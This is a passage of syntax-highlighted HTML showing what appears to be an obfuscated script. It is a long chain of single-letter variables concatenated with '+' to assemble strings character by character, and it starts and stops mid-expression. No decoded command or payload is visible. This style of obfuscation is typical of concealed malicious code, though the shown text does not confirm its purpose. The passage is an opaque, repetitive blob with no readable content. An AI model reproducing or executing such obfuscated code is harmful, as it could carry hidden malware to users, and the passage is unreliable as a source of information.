class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span><span class="variable">$z</span><span class="variable">$e</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$x</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$l</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span><span class="variable">$z</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span 